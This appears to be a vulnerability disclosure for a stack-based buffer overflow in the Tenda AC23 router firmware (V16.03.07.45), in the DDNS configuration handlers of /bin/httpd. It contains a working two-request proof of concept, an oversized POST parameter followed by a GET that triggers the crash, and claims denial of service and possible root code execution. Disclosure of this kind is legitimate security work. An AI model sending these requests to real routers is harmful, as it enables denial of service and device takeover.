# Tenda AC23 formGetSysToolDDNS stack-based overflow

## 1.Product 

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/1.jpg)

1. **product information: https://www.tenda.com.cn/** 
2. **firmware download:https://www.tenda.com.cn/download/detail-3420.html**

----

## 2.**Firmware**

**Hardware version:V1.0**

**Software version:V16.03.07.45**

## 3.vulnerability details

The vulnerability is in` /bin/httpd` , the function `formSetSysToolDDNS`, ` formGetSysToolDDNS` . The function `formSetSysToolDDNS` can set nvram val `adv.ddns1.en` to` v22` , **which can be set through POST parameter`ddnsEn`**

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/1.png)

and in function `formGetSysToolDDNS` , the function calls `GetValue(“adv.ddns1.en”, v11)` to set the string to` v11` which is on the stack. So there is a stack overflow vulnerability. By analyze the funtion GetValue and SetValue , the max size of the string we can get from the function GetValue is `0x5DC` . It’s bigger than the size of`v11 `

![image-20220924150554791](https://github.com/jingping911/tendaAC23overflow/blob/main/2.png)

so there is a buffer overflow vulnerability. 

## 4.poc
1. You need to login and **replace the Cookie: password filed in poc**.
2. By sending  poc1 and poc2 (remember to send poc2), it can cause dos and rce. 

```
POST /goform/SetDDNSCfg HTTP/1.1
Host: 192.168.0.1
Content-Length: 641
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/ddns_config.html?random=0.48392112228286877&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07adoikcvb
Connection: close
ddnsEn=111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111111111111111111111111111111111111111111111111111111
11111111111111111111111111111111111111111111111111&serverName=noip.com&ddnsUser=a&ddnsPwd=a&ddnsDomain=b.top
```

```
GET /goform/GetDDNSCfg?0.45256296854497835 HTTP/1.1
Host: 192.168.0.1
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/ddns_config.html?random=0.48392112228286877&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07adoikcvb
Connection: close
```

**By sending this poc, can achieve the effect of a denial-of-service(DOS) attack**

**Also can write exp to get a stable root shell.**





### 5.Author

*Wangjingping*
